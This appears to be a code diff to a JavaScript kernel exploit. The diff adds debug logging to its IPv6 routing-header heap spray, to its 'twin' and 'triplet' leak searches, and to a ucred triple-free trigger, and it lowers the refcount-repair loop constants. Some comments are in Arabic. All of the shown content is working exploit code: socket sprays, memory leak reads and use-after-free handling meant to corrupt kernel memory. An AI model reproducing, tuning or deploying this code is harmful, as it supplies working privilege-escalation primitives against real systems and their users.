@@ -236,12 +236,19 @@ function get_sockopt(sd, level, optname, optval, optlen) {
   }
   return read32(sockopt_len_ptr);
 }
-function set_rthdr(sd, buf, len) {
-  return set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
-  // debug("set_sockopt with sd: " + hex(sd) + " ret: " + hex(ret));
-  // debug("Called with buf: " + hex(read64(buf)) + " len: " + hex(len));
-  // return ret;
-}
+// 1) احفظ الدالة الأصلية
+var real_set_rthdr = set_rthdr;
+
+// 2) اعمل wrapper فوقها
+set_rthdr = function(sock, buf, len) {
+  log("[RTHDR] BEFORE sock=" + sock + " len=" + len);
+
+  var ret = real_set_rthdr(sock, buf, len);
+
+  log("[RTHDR] AFTER ret=" + ret);
+
+  return ret;
+};
 function get_rthdr(sd, buf, max_len) {
   return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len);
   // debug("get_sockopt with sd: " + hex(sd) + " ret: " + hex(ret));
@@ -769,6 +776,7 @@ function fill_buffer_64(buf, val, len) {
   }
 }
 function find_twins() {
+  log("[TWINS] enter find_twins");
   var count = 0;
   var val, i, j;
   var zeroMemoryCount = 0;
@@ -776,74 +784,113 @@ function find_twins() {
   twins[1] = -1;
   var spray_add = spray_rthdr.add(0x04);
   var leak_add = leak_rthdr.add(0x04);
+
   while (count < MAX_ROUNDS_TWIN) {
+    log("[TWINS] round=" + count);
+
     if (typeof debugging !== 'undefined' && debugging.info && debugging.info.memory && debugging.info.memory.available === 0) {
       zeroMemoryCount++;
+      log("[TWINS] zeroMemoryCount=" + zeroMemoryCount);
       if (zeroMemoryCount >= 5) {
+        log("[TWINS] zeroMemoryCount limit reached, cleanup & return false");
         cleanup();
         return false;
       }
     } else {
       zeroMemoryCount = 0;
     }
-    for (i = 0; i < ipv6_socks.length; i++) {
-      if (ipv6_socks[i].eq(BigInt_Error)) continue; // تعديل رقم 6
 
-      write32(spray_add, RTHDR_TAG | i);
-      read32(spray_add); // تعديل رقم 2 (memory barrier)
-
-      set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
-    }
+    // SPRAY
+    log("[TWINS] SPRAY phase start");
     for (i = 0; i < ipv6_socks.length; i++) {
       if (ipv6_socks[i].eq(BigInt_Error)) continue;
-      write32(leak_add, 0); // تعديل رقم 4
+
+      write32(spray_add, RTHDR_TAG | i);
+      read32(spray_add);
+
+      log("[TWINS] SPRAY i=" + i + " sock=" + ipv6_socks[i]);
+      set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
+    }
+    log("[TWINS] SPRAY phase end");
+
+    // LEAK
+    log("[TWINS] LEAK phase start");
+    for (i = 0; i < ipv6_socks.length; i++) {
+      if (ipv6_socks[i].eq(BigInt_Error)) continue;
+
+      write32(leak_add, 0);
       get_rthdr(ipv6_socks[i], leak_rthdr, 8);
       val = read32(leak_add);
       j = val & 0xFFFF;
+
+      log("[TWINS] LEAK i=" + i + " val=0x" + val.toString(16) + " j=" + j);
+
       if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j && j >= 0 && j < ipv6_socks.length) {
         twins[0] = i;
         twins[1] = j;
-        log(' TWINS : [' + i + '] [' + j + ']');
+        log("[TWINS] FOUND twins: [" + i + ", " + j + "]");
         return true;
       }
     }
+    log("[TWINS] LEAK phase end (no twins this round)");
+
     count++;
   }
+
+  log("[TWINS] FAILED: no twins after " + MAX_ROUNDS_TWIN + " rounds");
   twins[0] = -1;
   twins[1] = -1;
   return false;
 }
 function find_triplet(master, other, iterations) {
   if (typeof iterations === 'undefined') iterations = MAX_ROUNDS_TRIPLET;
+  log("[TRIPLET] enter find_triplet master=" + master + " other=" + other + " iterations=" + iterations);
+
   var count = 0;
   var val, i, j;
   var spray_add = spray_rthdr.add(0x04);
   var leak_add = leak_rthdr.add(0x04);
+
   while (count < iterations) {
+    log("[TRIPLET] round=" + count);
+
+    // SPRAY
+    log("[TRIPLET] SPRAY phase start");
     for (i = 0; i < ipv6_socks.length; i++) {
       if (i === master || i === other) continue;
-      if (ipv6_socks[i].eq(BigInt_Error)) continue; // تعديل رقم 6
+      if (ipv6_socks[i].eq(BigInt_Error)) continue;
 
       write32(spray_add, RTHDR_TAG | i);
-      read32(spray_add); // تعديل رقم 2
+      read32(spray_add);
 
+      log("[TRIPLET] SPRAY i=" + i + " sock=" + ipv6_socks[i]);
       set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
     }
-    write32(leak_add, 0); // تعديل رقم 4
+    log("[TRIPLET] SPRAY phase end");
+
+    // LEAK
+    write32(leak_add, 0);
     get_rthdr(ipv6_socks[master], leak_rthdr, 8);
     val = read32(leak_add);
     j = val & 0xFFFF;
 
-    // تعديل رقم 3 (منع false positives)
+    log("[TRIPLET] LEAK master=" + master + " val=0x" + val.toString(16) + " j=" + j);
+
     if (j === master || j === other) {
+      log("[TRIPLET] skip false positive j=" + j);
       count++;
       continue;
     }
+
     if ((val & 0xFFFF0000) === RTHDR_TAG && j >= 0 && j < ipv6_socks.length) {
+      log("[TRIPLET] FOUND triplet j=" + j);
       return j;
     }
+
     count++;
   }
+
+  log("[TRIPLET] FAILED: no triplet found");
   return -1;
 }
 function init_threading() {
@@ -1268,8 +1315,8 @@ function remove_uaf_file() {
   }
 }
 // ثوابت بدل الأرقام السحرية
-var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 48;
-var TRIPLEFREE_REFCOUNT_MAX_WAIT = 6000;
+var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 24;
+var TRIPLEFREE_REFCOUNT_MAX_WAIT = 3000;
 
 function trigger_ucred_triplefree() {
   log("[TRIGGER] enter trigger_ucred_triplefree");
